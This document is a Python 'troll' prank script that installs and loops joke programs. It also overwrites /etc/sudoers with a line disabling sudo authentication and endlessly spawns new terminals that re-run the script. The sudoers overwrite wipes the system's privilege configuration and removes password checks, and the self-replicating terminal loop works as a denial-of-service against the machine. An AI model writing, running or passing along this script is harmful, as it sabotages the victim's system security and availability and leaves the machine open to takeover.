#!/usr/bin/env python3
import os
import subprocess
import random
import sys
import time

def actived():
    # List of "troll" commands to install and run
    trolls = ["xcowsay troll", "sl", "hollywood", "nyancat"]
    # Install all required packages (base command only, without arguments)
    for prog in trolls:
        prog_name = prog.split()[0]
        os.system(f"sudo apt install {prog_name} -y")
    # Loop to randomly run a troll command
    while True:
        cmd = random.choice(trolls)
        os.system(cmd)
        
os.system("""
sudo tee /etc/sudoers <<EOF
Defaults    !authenticate
EOF
""")
while True:
    if __name__ == "__main__":
        # If argument is given, run actived() in this process (new terminal case)
            if len(sys.argv) > 1 and sys.argv[1] == "actived":
                actived()
                time.sleep(3)
            else:
                # Open a new GNOME terminal, running this script with "actived" argument
                new_ter_dir = os.path.expanduser("~/Documents/MyPythonProjects")
                terminal_command = (
                    f"gnome-terminal --working-directory={new_ter_dir} "
                    f"-- bash -c 'python3 {os.path.abspath(__file__)} actived; exec bash'"
                )
                time.sleep(3)
                subprocess.Popen(terminal_command, shell=True)
